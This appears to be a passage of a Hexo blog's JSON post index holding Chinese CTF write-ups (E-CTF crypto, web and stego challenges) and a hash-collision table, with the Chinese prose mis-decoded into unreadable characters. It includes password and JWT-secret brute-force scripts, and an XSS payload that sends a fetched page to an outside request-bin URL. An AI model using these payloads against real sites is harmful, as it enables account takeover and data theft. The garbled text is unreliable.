b&quot;&quot;.join(val.to_bytes(3, &quot;big&quot;) for val in m_ints)# æœ€ç»ˆè¿˜åŸ flag = b&quot;MVM&#123;&quot; + seed_recovered + b&quot;&#125;&quot;flag_recovered = b&quot;MVM&#123;&quot; + seed_recovered + b&quot;&#125;&quot;print(&quot;Recovered seed =&quot;, seed_recovered)print(&quot;Recovered flag =&quot;, flag_recovered)#æœ€åå¾—åˆ°çš„ç»“æœï¼š# Recovered M =# [7090542 3355762 6252149]# [5137236 3223662 3497780]# [7484255 7174495 6698102]# Recovered seed = b&#x27;l1n34r_fuNcT10n5_4r3_my_f4v&#x27;# Recovered flag = b&#x27;MVM&#123;l1n34r_fuNcT10n5_4r3_my_f4v&#125;&#x27;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"writeup","slug":"CTF/writeup","permalink":"https://archer-baiyi.github.io/categories/CTF/writeup/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://archer-baiyi.github.io/tags/writeup/"}]},{"title":"å“ˆå¸ŒåŠ å¯†çš„é•¿åº¦ä¸ç¢°æ’æƒ…å†µ","slug":"CTF/Crypto/å“ˆå¸ŒåŠ å¯†çš„é•¿åº¦ä¸ç¢°æ’æƒ…å†µ","date":"2025-03-09T18:36:57.000Z","updated":"2025-03-29T18:54:16.080Z","comments":true,"path":"2025/03/09/CTF/Crypto/å“ˆå¸ŒåŠ å¯†çš„é•¿åº¦ä¸ç¢°æ’æƒ…å†µ/","permalink":"https://archer-baiyi.github.io/2025/03/09/CTF/Crypto/%E5%93%88%E5%B8%8C%E5%8A%A0%E5%AF%86%E7%9A%84%E9%95%BF%E5%BA%A6%E4%B8%8E%E7%A2%B0%E6%92%9E%E6%83%85%E5%86%B5/","excerpt":"å¸¸è§çš„å“ˆå¸Œå‡½æ•°çš„é•¿åº¦åŠå…¶ç¢°æ’æƒ…å†µæ±‡æ€»","text":"ä»¥ä¸‹æ˜¯å„ç§å¸¸è§çš„å“ˆå¸Œå‡½æ•°çš„é•¿åº¦åŠå…¶ç¢°æ’æƒ…å†µæ±‡æ€»ï¼š å“ˆå¸Œé•¿åº¦ (bit) å¸¸è§ç®—æ³• ç¢°æ’æƒ…å†µ ç¢°æ’å¹´ä»½ å‘æ˜å¹´ä»½ çŠ¶æ€ 128-bit MD5 å­˜åœ¨å·²çŸ¥æœ‰æ•ˆç¢°æ’æ”»å‡» 2004 å¹´ 1992 å¹´ å·²è¿‡æ—¶ï¼Œä¸æ¨èä½¿ç”¨ 160-bit SHA-0, SHA-1, RIPEMD-160 SHA-0: å­˜åœ¨å·²çŸ¥æœ‰æ•ˆç¢°æ’æ”»å‡» SHA-0: 2004 å¹´ SHA-0: 1993 å¹´ SHA-0: å·²å¼ƒç”¨ï¼Œä¸æ¨èä½¿ç”¨ SHA-1: å­˜åœ¨å·²çŸ¥æœ‰æ•ˆç¢°æ’æ”»å‡» SHA-1: 2017 å¹´ SHA-1: 1995 å¹´ å·²è¿‡æ—¶ï¼Œä¸æ¨èä½¿ç”¨ 256-bit SHA-256, SHA-3-256 æš‚æ— å·²çŸ¥æœ‰æ•ˆç¢°æ’æ”»å‡» - SHA-256: 2001 å¹´ å®‰å…¨ï¼Œå¹¿æ³›ä½¿ç”¨ 384-bit SHA-384 æš‚æ— å·²çŸ¥æœ‰æ•ˆç¢°æ’æ”»å‡» - 2001 å¹´ å®‰å…¨ï¼Œé«˜å®‰å…¨æ€§éœ€æ±‚ 512-bit SHA-512, SHA-3-512 æš‚æ— å·²çŸ¥æœ‰æ•ˆç¢°æ’æ”»å‡» - SHA-512: 2001 å¹´ éå¸¸å®‰å…¨ï¼Œé«˜æ€§èƒ½éœ€æ±‚ ç¢°æ’æƒ…å†µè¯´æ˜ 128-bit (MD5): MD5 æ˜¯ä¸€ç§è¾“å‡ºä¸º 128 ä½çš„å“ˆå¸Œç®—æ³•ï¼Œä½†ç”±äºå…¶è®¾è®¡çš„å®‰å…¨æ€§ä¸è¶³ï¼Œæ—©åœ¨ 2004 å¹´å°±è¢«å‘ç°å¯ä»¥æœ‰æ•ˆåˆ¶é€ ç¢°æ’ã€‚ MD5 äº 1992 å¹´è¢«å‘æ˜ï¼Œä¸é€‚åˆä»»ä½•éœ€è¦å¯†ç å­¦å®‰å…¨æ€§çš„åœºæ™¯ï¼Œä»…å¯ç”¨äºä½å®‰å…¨æ€§å®Œæ•´æ€§æ ¡éªŒã€‚ 160-bit (SHA-0, SHA-1, RIPEMD-160): SHA-0 æ˜¯ SHA ç³»åˆ—çš„åˆä»£ç‰ˆæœ¬ï¼Œå­˜åœ¨ä¸¥é‡çš„è®¾è®¡ç¼ºé™·ï¼Œåœ¨ 2004 å¹´è¢«è¯æ˜å¯ä»¥åˆ¶é€ ç¢°æ’ã€‚SHA-0 äº 1993 å¹´å‘æ˜ã€‚ SHA-1 ä½œä¸ºè¾“å‡º 160 ä½çš„ä¸»æµç®—æ³•ï¼Œåœ¨ 2017 å¹´è¢«è¯å®å¯ä»¥é€šè¿‡ç†è®ºå’Œå®è·µæ”»å‡»åˆ¶é€ ç¢°æ’ã€‚SHA-1 äº 1995 å¹´å‘æ˜ã€‚ RIPEMD-160 è™½å°šæœªæœ‰å…¬å¼€çš„ç¢°æ’è®°å½•ï¼Œä½†ä¸å¦‚æ›´é«˜ä½ç®—æ³•å®‰å…¨ã€‚ 256-bit (SHA-256, SHA-3-256): ç›®å‰æ²¡æœ‰å·²çŸ¥çš„ç¢°æ’æ”»å‡»ã€‚ SHA-256 äº 2001 å¹´è¢«å‘æ˜ï¼Œé€‚åˆç»å¤§å¤šæ•°åœºæ™¯ï¼Œå¦‚æ•°å­—ç­¾åã€åŒºå—é“¾å’Œæ•°æ®å®Œæ•´æ€§éªŒè¯ã€‚ 384-bit (SHA-384): ä¸ºé«˜å®‰å…¨éœ€æ±‚è®¾è®¡ï¼Œæœªæœ‰ä»»ä½•å·²çŸ¥çš„ç¢°æ’æ”»å‡»ã€‚ SHA-384 äº 2001 å¹´å‘æ˜ï¼Œé€‚ç”¨äºå¯†é’¥äº¤æ¢ã€é•¿æ—¶é—´æ•°æ®å­˜å‚¨ç­‰é«˜å®‰å…¨æ€§åº”ç”¨ã€‚ 512-bit (SHA-512, SHA-3-512): æä¾›æé«˜çš„å®‰å…¨æ€§ï¼Œç‰¹åˆ«é€‚ç”¨äºå¯¹æŠ—æ½œåœ¨çš„é‡å­è®¡ç®—å¨èƒã€‚ SHA-512 äº 2001 å¹´å‘æ˜ï¼Œæ€§èƒ½æ¶ˆè€—è¾ƒé«˜ï¼Œé€‚åˆé•¿æœŸå­˜å‚¨çš„åœºæ™¯ã€‚","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/categories/CTF/Crypto/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/tags/CTF/"},{"name":"å“ˆå¸Œ","slug":"å“ˆå¸Œ","permalink":"https://archer-baiyi.github.io/tags/%E5%93%88%E5%B8%8C/"},{"name":"Hash","slug":"Hash","permalink":"https://archer-baiyi.github.io/tags/Hash/"}]},{"title":"E-CTFæ¯”èµ› Writeup","slug":"CTF/Writeup/E-CTF-Writeup","date":"2025-03-02T23:17:07.000Z","updated":"2025-03-25T19:31:29.228Z","comments":true,"path":"2025/03/03/CTF/Writeup/E-CTF-Writeup/","permalink":"https://archer-baiyi.github.io/2025/03/03/CTF/Writeup/E-CTF-Writeup/","excerpt":"E-CTFæ¯”èµ›çš„é¢˜è§£ï¼Œæ¶‰åŠæ–¹å‘ï¼šCrypto, Web, Steg, Misc, Forensics, Osint","text":"1. Cryptographyï¼ˆå¯†ç å­¦ï¼‰ASCII me anything but not the flag æ ¹æ®å®ƒçš„æç¤ºï¼Œæˆ‘ä»¬å…ˆå°†è¿™æ®µå†…å®¹ç”¨ASCIIè§£ç ï¼Œå¾—åˆ°ï¼š 123456789108 100 111 109 123 85 99 49 122 95 106 53 95 79 111 51 95 88 52 116 95 48 109 95 51 111 88 121 90 107 97 106 48 105 125 10 10 69 98 111 98 32 102 112 32 118 108 114 111 32 104 98 118 44 32 100 108 108 97 32 105 114 122 104 32 58 32 72 66 86 72 66 86 10 10 87 101 108 108 32 100 111 110 101 44 32 98 117 116 32 110 111 119 32 100 111 32 121 111 117 32 107 110 111 119 32 97 98 111 117 116 32 116 104 101 32 103 117 121 32 119 104 111 32 103 111 116 32 115 116 97 98 98 101 100 32 50 51 32 116 105 109 101 115 32 63-&gt;ldom&#123;Uc1z_j5_Oo3_X4t_0m_3oXyZkaj0i&#125;Ebob fp vlro hbv, dlla irzh : HBVHBVWell done, but now do you know about the guy who got stabbed 23 times ? ç¬¬ä¸‰æ®µçš„æŒ‡çš„æ˜¯å‡¯æ’’å¤§å¸è¢«åˆºæ€çš„äº‹ä»¶ï¼š æ‰€ä»¥æˆ‘ä»¬å°è¯•éå†å‰ä¸¤æ®µçš„å‡¯æ’’åŠ å¯†ç»“æœï¼Œä½†åªæœ‰ç¬¬äºŒæ®µå¯ä»¥å¾—åˆ°æœ‰ç”¨ä¿¡æ¯ï¼š 1Here is your key, good luck : KEYKEY å¯ä»¥å¾—çŸ¥å¯†é’¥ä¸ºï¼šâ€HBVHBVâ€œï¼ˆæˆ‘ä¸€å¼€å§‹ä»¥ä¸ºå¯†ç å°±æ˜¯KEYKEYï¼‰ã€‚ç”±äºç¬¬ä¸€æ®µæ‹¬å·å‰çš„å†…å®¹ä¸º4ä¸ªå­—æ¯ï¼Œåˆšå¥½å¯¹çš„ä¸Šâ€ectfâ€œï¼Œæ‰€ä»¥åº”è¯¥æ˜¯å•è¡¨æˆ–è€…å¤šè¡¨æ›¿æ¢åŠ å¯†ã€‚å†å› ä¸ºå¯†é’¥ä¸ºé‡å¤çš„å†…å®¹ï¼Œä¸éš¾çŒœæµ‹è¿™åº”è¯¥æ˜¯â€œVigenere ç»´å‰å°¼äºšå¯†ç â€ã€‚äºæ˜¯æ‰¾ä¸ªåœ¨çº¿çš„è§£å¯†ç½‘é¡µï¼ˆhttps://planetcalc.com/2468/#google_vignetteï¼‰ä¾¿å¯ä»¥å¾—åˆ°flagï¼š 1ectf&#123;th1s_i5_th3_w4y_0f_3ncrypti0n&#125; OIIAIOIIIAI ğŸ˜¼ ç”±äºçŸ¥é“è¿™æ¬¡æ¯”èµ›çš„flagæ ¼å¼ä¸ºectf{}ï¼Œæ‰€ä»¥ä¸éš¾å‘ç°è¿™ä¸²å­—ç¬¦çš„å¶æ•°ä½åº”è¯¥æ˜¯flagçš„å¼€å¤´ï¼Œä¹Ÿå°±æ˜¯ï¼š 1ectf&#123;y0U_5p1N_M3 è€Œç”±äº}åœ¨å­—ç¬¦ä¸²å¼€å¤´ï¼Œæ‰€ä»¥çŒœæµ‹åŸºæ•°ä½çš„å€’åºä¸ºflagçš„ååŠéƒ¨åˆ†ï¼š 1R1GhT_R0unD_B4bY&#125; æ‹¼åœ¨ä¸€èµ·å¾—åˆ°flagï¼š 1ectf&#123;y0U_5p1N_M3_R1GhT_R0unD_B4bY&#125; Hashes Binder é¦–å…ˆä¼šä¸‹è½½å¾—åˆ°3ä¸ªæ–‡ä»¶ï¼š ç”±äºè¿™ä»½Excelæ–‡ä»¶è¢«è®¾ç½®äº†å¯†ç ä¿æŠ¤ï¼Œæ‰€ä»¥æˆ‘ä»¬å°è¯•ç”¨è¿™ä¸ªwordlisté‡Œçš„å†…å®¹æ¥çˆ†ç ´å®ƒï¼š 1234567891011121314151617181920212223import msoffcryptoimport ioencrypted_file = &quot;parts.xlsx&quot; password_list = &quot;wordlist.txt&quot; with open(password_list, &quot;r&quot;, encoding=&quot;utf-8&quot;) as f: passwords = [line.strip() for line in f.readlines()]for password in passwords: try: with open(encrypted_file, &quot;rb&quot;) as file: office_file = msoffcrypto.OfficeFile(file) office_file.load_key(password=password) decrypted_file = io.BytesIO() office_file.decrypt(decrypted_file) print(f&quot;æˆåŠŸç ´è§£å¯†ç : &#123;password&#125;&quot;) break except Exception: continue# æˆåŠŸç ´è§£å¯†ç : dolphin æ‰“å¼€Excelæ–‡ä»¶åä¼šçœ‹åˆ°3éƒ¨åˆ†å†…å®¹ 123456789Part 1036074c2585230c1ad9e6b654a1671ac13ee856eb505f44346593e1748a6a52aPart 22H8ZcpmQyRisnPart 3cHJlc2NyaXB0aW9u é¦–å…ˆæ³¨æ„åˆ°ç¬¬2ï¼Œ3éƒ¨åˆ†éå¸¸åƒbase64ç¼–ç å†…å®¹ï¼Œäºæ˜¯å°è¯•è§£ç ï¼Œç¬¬ä¸‰éƒ¨åˆ†ä¼šæˆåŠŸè§£å‡ºæ¥ï¼š 1prescription ç¬¬äºŒéƒ¨åˆ†åˆ™æç¤ºè§£ç å¤±è´¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å°è¯•å…¶ä»–baseè§£ç ï¼Œæœ€åç”¨base58æˆåŠŸè§£ç å¾—åˆ°ï¼š 1digestive ç¬¬ä¸€éƒ¨åˆ†åˆ™éå¸¸åƒå“ˆå¸ŒåŠ å¯†çš„ç»“æœï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨è¿™ä¸ªç½‘ç«™è¯•ä¸€ä¸‹èƒ½ä¸èƒ½ç ´è§£ https://hashes.com/en/decrypt/hash æç¤ºç ´è§£æˆåŠŸï¼ŒåŸæ–‡ä¸ºspookyï¼Œå¹¶ä¸”ä½¿ç”¨çš„ç®—æ³•æ˜¯Gost Hashã€‚ï¼ˆspookyå…¶å®ä¹Ÿåœ¨è¿™ä¸ªwordlist.txté‡Œï¼Œæ‰€ä»¥ç†è®ºä¸Šæ¥è¯´è¿™ä¸€æ­¥ä¹Ÿå¯ä»¥ç”¨çˆ†ç ´å¾—åˆ°ã€‚ï¼‰ äºæ˜¯ç”¨ 1dolphin_spooky_digestive_prescription æˆåŠŸè§£å‹.zipå‹ç¼©åŒ…å¾—åˆ°flagï¼š 1ECTF&#123;J0nH_tH3_Cr4ck3R_95234826&#125; RSA intro è¿™é“é¢˜æˆ‘ä»¬ä¼šå¾—åˆ°ä»¥ä¸‹å†…å®¹ï¼š 1234n = 1184757578872726401875541948122658312538049254193811194706693679652903378440466755792536161053191231432973156335040510349121778456628168943028766026325269453310699198719079556693102485413885649073042144349442001704335216057511775363148519784811675479570531670763418634378774880394019792620389776531074083392140830437849497447329664549296428813777546855940919082901504207170768426813757805483319503728328687467699567371168782338826298888423104758901089557046371665629255777197328691825066749074347103563098441361558833400318385188377678083115037778182654607468940072820501076215527837271902427707151244226579090790964814802124666768804586924537209470827885832840263287617652116022064863681106011820233657970964986092799261540575771674176693421056457946384672759579487892764356140012868139174882562700663398653410810939857286089056807943991134484292518274473171647231470366805379774254724269612848224383658855657086251162811678080812135302264683778545807214278668333366983221748107612374568726991332801566415332661851729896598399859186545014999769601615937310266497300349207439222706313193098254004197684614395013043216709335205659801602035088735521560206321305834999363607988482888525092210585343868702766655032190348593070756595867719633492847013620378010952424253098519859359544101947494405255181048550165119679168071637363387551385352023888031983210940358096667928019837327581681936262186049576626435407253113152851511562799379477905913074052917135254673527350886619693800827592241738185465519368503599267554966329609741719839452532720121891782656000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001e = 65537c = 393830705821083872264416484945379590743951209334251680140561629963083955435155434968501995173717065691853716117413549060471633713246813706134614822460487831949312719410922980049951577395596254279195364667821988767675462852220254638390252652391863031378262058213973374365653466528787640726441241664538814924465041415751207617994829099967542528845558372954608772395722055861369383117996161988362298650918468621344968162697585757444815069821774651095279049590140325395770490299618719676066106689396243767847620065054763147901166291755102218540290732819710294120101688593205036339603152228827861450774360237006971191234350634731104643779249017990427055169232234892324512234471025984131134122883594190002695857381320761826426970820621555957081409595866374650139218172798735536295519361258955868218458841069870611367807353745731928726480481254620623949030522228724677423429285228917983167742866068764059333196595815029550909470984427785123479796787934189869159245455191142352654087327876642690754428041545205764160668875253155015956045237338532248073834631989395905208181116526111301051883717335829373670674970007067708289628731972707477338551521585672558157829354894929466723788269911067380887281008564055766243843557738727000164255990684153972958815292767702154995098383096546576559199090417518282978657504210433584144451378874050676287588884988934683793378300065910040270282398699691108573435112129408980056605713259535036581461672565785674329469547540861581715756111296028940885214170609934085009608200810707122173370006290459841638659407675519141544675968270051746963709729460531469035621873301953785282870733516854080405064440750450304537433849449545664331761838457477121677018421695909336075840076436991397964264703526101810961378256559625011198775706699 å› ä¸ºæ²¡æœ‰å…¶ä»–ä¿¡æ¯äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆç”¨ http://www.factordb.com/index.php è¯•ä¸€ä¸‹æš´åŠ›åˆ†è§£nï¼š æˆåŠŸå¾—åˆ°nçš„å…¶ä¸­ä¸€ä¸ªå› æ•°ä¸º5054843ã€‚ä¹‹åå°±åªéœ€è¦å†™ä¸€æ®µä»£ç è§£å¯†å°±å¯ä»¥å¾—åˆ°flagï¼š 123456789101112131415from Crypto.Util.number import inverse, long_to_bytesdef rsa_decrypt(n, e, c, p): q = n // p phi_n = (p - 1) * (q - 1) d = inverse(e, phi_n) m = pow(c, d, n) return long_to_bytes(m).decode(&#x27;utf-8&#x27;)n = e = 65537c = p = 5054843 plaintext = rsa_decrypt(n, e, c, p)print(&quot;è§£å¯†ç»“æœ:&quot;, plaintext)# è§£å¯†ç»“æœ: ectf&#123;b4sic_F4cT0rDb_rS4&#125; Cracking the Vault è¿™é“é¢˜æˆ‘ä»¬ä¼šå¾—åˆ°2ä»½æ–‡ä»¶ï¼Œä¸€ä»½æ˜¯pythonçš„ä»£ç ï¼Œå…³äºåŠ å¯†ç®—æ³•çš„ï¼Œå¦ä¸€ä»½æ–‡ä»¶åˆ™æ˜¯åŠ å¯†åçš„ç»“æœã€‚ æˆ‘ä»¬é¦–å…ˆæ¥çœ‹ä¸€ä¸‹åŠ å¯†çš„å…·ä½“è¿‡ç¨‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import secretsimport hashlibdef encryption(text): encrypted = [] random = secrets.SystemRandom() padding_length = 256 - len(text) % 256 raw_padding = [chr(random.randint(32, 126)) for _ in range(padding_length)] scrambled_padding = [chr((ord(c) * 3 + 7) % 94 + 32) for c in raw_padding] shifted_padding = scrambled_padding[::-1] padded_text = &#x27;&#x27;.join(shifted_padding) + text final_padded_text = &#x27;&#x27;.join( chr((ord(c) ^ 42) % 94 + 32) if i % 2 == 0 else c for i, c in enumerate(padded_text) ) secret_key = str(sum(ord(c) for c in text)) secret_key = secret_key[::-1] hashed_key = hashlib.sha256(secret_key.encode()).hexdigest() seed = int(hashed_key[:16], 16) random = secrets.SystemRandom(seed) for i, char in enumerate(text): char_code = ord(char) shift = (i + 1) * 3 transformed = (char_code + shift + 67) % 256 encrypted.append(chr(transformed)) return &#x27;&#x27;.join(encrypted), seedwith open(&#x27;VaultKey.txt&#x27;, &#x27;r&#x27;) as f: text = f.read()encrypted_text, seed = encryption(text)with open(&#x27;VaultKey_encrypted.txt&#x27;, &#x27;w&#x27;) as f: f.write(encrypted_text)print(&quot;The file has been successfully encrypted!&quot;) æˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°è¿™æ®µä»£ç é‡Œæœ‰å¾ˆå¤šå¤šä½™çš„å†…å®¹ï¼ˆæŒ‡æ²¡æœ‰çœŸæ­£å‡ºç°åœ¨åŠ å¯†è¿‡ç¨‹ä¸­ï¼‰ï¼ŒçœŸæ­£è·ŸåŠ å¯†ç®—æ³•ç›¸å…³çš„å…¶å®åªæœ‰è¿™ä¸€æ®µ 1234567for i, char in enumerate(text): char_code = ord(char) shift = (i + 1) * 3 transformed = (char_code + shift + 67) % 256 encrypted.append(chr(transformed)) return &#x27;&#x27;.join(encrypted), seed æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦é€†å‘ä¸€ä¸‹è¿™ä¸ªåŠ å¯†é€»è¾‘ä¾¿å¯ä»¥å¾—åˆ°flagï¼š 123456789101112131415def decryption(encrypted_text): decrypted_chars = [] for i, enc_char in enumerate(encrypted_text): enc_code = ord(enc_char) shift = 3 * (i + 1) + 67 orig_code = (enc_code - shift) % 256 decrypted_chars.append(chr(orig_code)) return &#x27;&#x27;.join(decrypted_chars)with open(&#x27;VaultKey_encrypted.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;) as f: encrypted_text = f.read()print(decryption(encrypted_text))# Well done! I bet you&#x27;re great at math. Here&#x27;s your flag, buddy: ectf&#123;1t_W45_ju5T_4_m1nu5&#125; Never two without three æˆ‘ä»¬é¦–å…ˆä¼šå¾—åˆ°è¿™äº›å†…å®¹ï¼š 1AEBvoE14n2JjDEhaEO5eAGnEFGdXluF2FNJxC01jXNPQX3PVl3T5oOm4DQrVXFXJGDBxEudVC3E5Xuh0oFzY ç›´æ¥å°è¯•base64è§£ç ä¼šæç¤ºå¤±è´¥ï¼Œæ‰€ä»¥æ ¹æ®å®ƒçš„æç¤ºæˆ‘ä»¬å…ˆéå†å®ƒçš„æ‰€æœ‰å‡¯æ’’åŠ å¯†ç„¶åå†è§£ç ï¼š 12345678910111213141516171819202122232425262728293031import base64import stringdef caesar_cipher_decrypt(text, shift): decrypted_text = &quot;&quot; for char in text: if char in string.ascii_letters: is_upper = char.isupper() alphabet = string.ascii_uppercase if is_upper else string.ascii_lowercase new_index = (alphabet.index(char) - shift) % 26 decrypted_text += alphabet[new_index] else: decrypted_text += char return decrypted_textdef try_base64_decode(text): try: decoded_data = base64.b64decode(text).decode(&#x27;utf-8&#x27;) return decoded_data except Exception: return Nonecipher_text = &quot;AEBvoE14n2JjDEhaEO5eAGnEFGdXluF2FNJxC01jXNPQX3PVl3T5oOm4DQrVXFXJGDBxEudVC3E5Xuh0oFzY&quot;for shift in range(26): decrypted_text = caesar_cipher_decrypt(cipher_text, shift) base64_decoded = try_base64_decode(decrypted_text) if base64_decoded: print(f&quot;Shift: &#123;shift&#125;, è§£ç : &#123;base64_decoded&#125;&quot;)# Shift: 10, è§£ç : ADeyMxwfsMLjPNnAgTUkMnEvT6gKMs41F7qKoryxG8LhK5SYY4gRKKKu96LtyZN å‘ç°è¿™æ˜¯å”¯ä¸€å¯ä»¥æˆåŠŸè§£ç å‡ºæ¥çš„å†…å®¹ã€‚æˆ‘ä»¬å†æ¬¡å°è¯•ç”¨base64è§£ç è¿™æ®µå†…å®¹ä¼šæç¤ºå¤±è´¥ï¼Œæ‰€ä»¥è¿˜æ˜¯è½¬æˆ˜å…¶ä»–çš„baseç¼–ç ï¼Œæœ€åå†æ¬¡ç”¨base58æˆåŠŸè§£ç å¾—åˆ°ï¼š 1The flag is: ectf&#123;D0_u_l0v3_t4e_crypt0grap413&#125; 2. WebJava Weak Token å…ˆç®€å•ç§‘æ™®ä¸€ä¸‹JWTï¼š JWTæ˜¯ä¸€ä¸²base64ç¼–ç ï¼Œè¢«ç”¨.åˆ†æˆ3éƒ¨åˆ†ã€‚ç¬¬ä¸€éƒ¨åˆ†æ˜¯headerï¼Œé‡Œé¢ä¼šå†™ä½¿ç”¨çš„ç®—æ³•ä»¥åŠtypï¼ˆä¸€èˆ¬éƒ½æ˜¯JWTï¼‰ã€‚ç¬¬äºŒéƒ¨åˆ†æ˜¯Payloadï¼Œæ˜¯JWTçš„æ ¸å¿ƒå†…å®¹ï¼Œé€šå¸¸ä¼šçºªå½•å½“å‰JWTæ‰€æœ‰è€…çš„èº«ä»½ä¿¡æ¯ã€‚ç¬¬ä¸‰éƒ¨åˆ†åˆ™æ˜¯ç­¾åï¼Œä¼šè®¡ç®— 1HMACSHA256(base64UrlEncode(header) + &quot;.&quot; +base64UrlEncode(payload),å¯†é’¥) ä»¥ç¡®ä¿å½“å‰ä¿¡æ¯çš„å®Œæ•´æ€§ï¼ˆintegrityï¼‰ï¼ŒçœŸå®æ€§ï¼ˆauthenticityï¼‰ã€‚ åœ¨è¿™é“é¢˜æˆ‘ä»¬ä¼šé¦–å…ˆåœ¨ç›®æ ‡ç½‘ç«™é‡Œå¾—åˆ°æˆ‘ä»¬çš„JWTï¼ˆæˆ‘ä»¬æ¯æ¬¡è®¿é—®ç½‘ç«™éƒ½ä¼šå¾—åˆ°ä¸€ä¸ªæ–°çš„JWTï¼‰ï¼š 1eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJleHAiOjE3MzgzNTcwMDV9.0dmdQRyyCngN1JJTVoVVk5WYqz0I44yBvWHyUEMXTzM ç”¨ https://jwt.io/ åˆ†æä¸€ä¸‹ï¼š å¯ä»¥çœ‹åˆ°ï¼ŒPayloadé‡Œæœ‰ä¸€ä¸ªåä¸ºâ€usernameâ€œçš„å€¼å½“å‰è¢«è®¾ç½®ä¸ºâ€œuserâ€ï¼Œæˆ‘ä»¬çŒœæµ‹åªéœ€è¦å°†å…¶æ”¹æˆâ€œadminâ€å¹¶ä¸”ç”¨å…¶å†æ¬¡è®¿é—®ç½‘ç«™å³å¯è·å¾—flagã€‚ æ ¹æ®é¢˜ç›®çš„æç¤ºï¼Œæˆ‘ä»¬å…ˆå°†è¿™ä¸ªJWTçš„å¯†é’¥ç»™çˆ†ç ´å‡ºæ¥ï¼š 1234567891011121314151617181920212223242526272829import jwtimport timedef brute_force_jwt(token): # header, payload, signature = token.split(&#x27;.&#x27;) with open(&quot;rockyou.txt&quot;, &#x27;r&#x27;, encoding=&#x27;latin-1&#x27;) as f: for line in f: secret = line.strip() try: decoded = jwt.decode(token, secret, algorithms=[&#x27;HS256&#x27;]) print(f&quot;[+] Found secret key: &#123;secret&#125;&quot;) print(f&quot;Decoded JWT: &#123;decoded&#125;&quot;) return secret except jwt.ExpiredSignatureError: print(f&quot;[-] Expired token with key: &#123;secret&#125;&quot;) return secret except jwt.InvalidTokenError: pass print(&quot;[-] No valid secret found in wordlist.&quot;) return Nonejwt_token = &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJleHAiOjE3MzgzNTcwMDV9.0dmdQRyyCngN1JJTVoVVk5WYqz0I44yBvWHyUEMXTzM&quot;brute_force_jwt(jwt_token)# [+] Found secret key: 1234 ç”¨è¿™ä¸ªç½‘ç«™å°†æˆ‘ä»¬çš„JWTçš„payloadæ”¹æˆâ€œadminâ€ ä¹‹åå†ç”¨è¿™ä¸ªæ–°çš„JWTè®¿é—®ç½‘ç«™å³å¯å¾—åˆ°flagï¼š 1ectf&#123;JwT_T0keN_cR34t0r&#125; Chat with the admin è¿™é“é¢˜æ¯”è¾ƒæ˜æ˜¾åœ°æš—ç¤ºäº†æˆ‘ä»¬éœ€è¦ç”¨xssæ”»å‡»æ¥è·å–flagã€‚æˆ‘ä»¬é¦–å…ˆåœ¨ https://pipedream.com/ åˆ›å»ºä¸€ä¸ªRequest Binï¼ˆåˆ›å»ºä¸´æ—¶çš„ HTTP ç«¯ç‚¹ï¼Œç”¨äºæ•è·å’Œæ£€æŸ¥ä¼ å…¥çš„ HTTP è¯·æ±‚ã€‚ï¼‰ï¼Œ ç„¶ååœ¨å¯¹è¯æ¡†é‡Œè¾“å…¥ä»¥ä¸‹å†…å®¹å³å¯ï¼š 1&lt;script&gt;fetch(&#x27;http://instances.ectf.fr:11111/&#x27;).then(response =&gt; response.text()).then(text =&gt; document.location=&quot;https://xxxxxxxxxxxx.m.pipedream.net?flag=&quot;+btoa(encodeURIComponent(text)))&lt;/script&gt; ä¹‹åä¾¿ä¼šåœ¨Request Binçš„è®¿é—®çºªå½•é‡ŒæŸ¥çœ‹flagï¼š 1ECTF&#123;Cook13_st0L3n_5ucc3ssfuLLy&#125; 3. Steganographyï¼ˆéšå†™ï¼‰Definitely not in the PDF å°†ä¸‹è½½çš„å‹ç¼©åŒ…è§£å‹ä¼šå¾—åˆ°ä¸€ä»½pdfæ–‡ä»¶ï¼š /Stega_-_Definitely_not_in_the_PDF/world_flags.jpg) å¹¶æ²¡æœ‰ä»»ä½•å‘ç°ï¼Œå†æ ¹æ®ä»–ä¸€ç›´è¯´çš„â€œflagâ€ä¸åœ¨è¿™é‡Œï¼Œäºæ˜¯å†³å®šå»çœ‹ä¸€å¼€å§‹çš„å‹ç¼©åŒ…ã€‚æœç„¶åœ¨æ–‡ä»¶ç»“å°¾å‘ç°flagï¼š 1ECTF&#123;W3lL_d0nE_652651663616263&#125; JB1804 æˆ‘ä»¬ä¼šå¾—åˆ°ä¸€ä»½ä¹è°±ï¼š é€šè¿‡æ£€æŸ¥å‘ç°å®ƒå¹¶æ²¡æœ‰éšå†™ä»»ä½•å†…å®¹åœ¨hexæ–‡ä»¶é‡Œï¼ŒæŠ‘æˆ–æ˜¯LSBéšå†™ã€‚ é€šè¿‡è°·æ­Œæœç´¢â€œmusic Steganography 1804â€å¯ä»¥å‘ç°è¿™ä¸ªç»´åŸºè¯æ¡ï¼š ç‚¹è¿›å»ä¹‹åæœç´¢â€œ1804â€ä¼šå‘ç°Johann BÃ¼ckingåœ¨1804å¹´å‘æ˜äº†ä¸€ç§ä¹è°±å¯†ç ï¼š æ ¹æ®è¿™å¼ å¯†ç è¡¨è§£ç ä¼šå¾—åˆ°ï¼š 1ectf&#123;steganomousiqueissuperswag&#125; (æ³•è¯­ä¸­çš„â€œéŸ³ä¹â€œæ˜¯â€musiqueâ€œï¼Œæ‰€ä»¥flagçš„å†…å®¹ä¸ºstegano mousique is super swagã€‚) The islandâ€™s treasure ä¸‹è½½æ–‡ä»¶ä¼šå¾—åˆ°2å¼ 